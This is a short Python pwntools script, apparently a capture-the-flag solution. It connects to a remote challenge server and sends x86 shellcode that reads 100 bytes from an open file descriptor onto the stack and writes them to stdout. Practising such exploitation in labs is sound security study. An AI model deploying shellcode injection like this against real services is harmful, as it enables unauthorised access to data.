from pwn import *
import re

# p = process("./simple")
p = remote('plsdonthaq.me', 3001)

assembly = f"""
    # read 100 bytes from from fd 1000 to esp
    mov eax, 0x03    # syscall 3: read
    mov ebx, 1000    # open FD 1000
    mov ecx, esp     # Read into ESP
    mov edx, 100     # Read 100 bytes
    int 0x80         # sycall

    # print n bytes from esp
    mov edx, eax     # print n bytes
    mov eax, 0x04    # syscall 4: write
    mov ebx, 0x01    # fd 1: stdout
    # mov ecx, esp   # Read from ESP
    int 0x80         # syscall
"""

payload = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))

p.recvuntil("enter your shellcode:")
p.sendline(payload)
p.recvuntil("jumping to shellcode\n")
print(p.recvline(keepends=False))